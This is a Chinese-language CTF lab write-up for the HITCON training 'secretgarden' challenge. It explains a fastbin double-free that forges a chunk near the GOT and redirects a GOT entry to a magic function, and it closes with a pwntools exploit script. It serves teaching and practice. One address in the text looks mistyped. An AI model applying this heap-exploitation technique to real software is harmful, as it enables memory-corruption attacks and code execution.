---
title: lab12_secretgarden
date: 2019-07-19
categories: 
- hitcon_trainning
tags: heap double_free
---

# double_free

## 场景
- `fastbin`（一般是）
- `free`后没有将指针置空

## 流程

![process](https://c-ssl.duitang.com/uploads/item/201907/19/20190719134950_ARVQR.png)

# 思路

利用double_free更改某个函数的got表为magic函数的地址。

## 注意点

- `fake_chunk` 的size域要合适，只用考虑一个字中的低4个字节。无需考虑和8对齐，因为最后3个bits是AMP标志。   

    和got表相近的地方，有一个   
    ![avatar](https://c-ssl.duitang.com/uploads/item/201907/19/20190719140152_QJXWk.png)

    写全的话，是`0x0000000000601e28`。这里的`\x60`刚好可以满足上述要求。
    - 可以看到这个地方的地址是`0x602000`,那么`\x60`的地址是 `0x602000 - 0x8 + 0x3` 也就是`0x601ffb`，size域的整个字节的地址是`0x6012002`。  
    那么`fake_chunk` 的地址就是`0x601ffa`。

- 由于改的是got表，所以要用六个字节对齐0x8。  

- magic的地址按理是随便选一个，但是`_dl_runtime_resolve_xsavec`并不在got表中。
    ![](https://c-ssl.duitang.com/uploads/item/201907/19/20190719142205_5ArV5.png)   
    ![](https://c-ssl.duitang.com/uploads/item/201907/19/20190719142341_LNmMn.png)   
    我已开始把他也覆盖成magic的地址，然后就循环执行`magic`。 覆盖成0就正常在执行`puts`的时候执行了`magic`。
    
    - 这里我找到了github上一篇<a href="https://github.com/lattera/glibc/blob/master/sysdeps/x86_64/dl-trampoline.S">glibc的源码</a>, 宏定义了很多有关`_dl_runtime_resolve`的东西    
    ![](https://c-ssl.duitang.com/uploads/item/201907/19/20190719143552_WAT5L.png)   
    为什么每个都能define`_dl_runtime_resolve`一下？？貌似也和动态链接库有关。我猜可能是调用函数的函数。<a href = "https://build.opensuse.org/package/view_file/openSUSE:Leap:15.0/glibc/dl-runtime-resolve-xsave.patch?expand=0">资料</a>，看不懂，心累。

## getshell?

看起来是可以的，但可能就是麻烦一点。
- double_free到fake_chunk,用show打印某个got表项值，计算libc基址。
- double_free改got表   
麻烦在怎么找一个合适的size，能既不覆盖需要打印的原有got表也能够通过free的检查……

# exp

2.27仍旧没法跑= =

```python
from pwn import * 
context.log_level = 'debug'
context.terminal = ['deepin-terminal','-x','sh','-c']

def add(length,name,color):
    sh.sendlineafter('choice : ','1')
    sh.sendlineafter('name :',str(length))
    sh.sendlineafter('flower :',name)
    sh.sendlineafter('flower :',color)

def remove(index):
    sh.sendlineafter('choice : ','3')
    sh.sendlineafter('garden:',str(index))

def show():
    addr = u64(sh.recvuntil('\x7f')[-6] + '\x00\x00')
    return addr

if __name__ == "__main__":
    sh = process('./secretgarden')
    elf = ELF('./secretgarden')
    libc = elf.libc

    add(0x50,'a' * 8, 'a')
    add(0x50,'b' * 8, 'b')

    remove(0)
    remove(1)
    remove(0)

    fake_chunk = 0x601ffa
    magic = elf.symbols['magic']
    payload = 'A' * 6 + p64(0) + p64(magic) * 2

    pause()
    add(0x50,p64(fake_chunk),'a')
    add(0x50,'b' * 8,'a')
    add(0x50,'a' * 8,'a')
    add(0x50,payload,'a')

    sh.interactive()
    sh.close()

```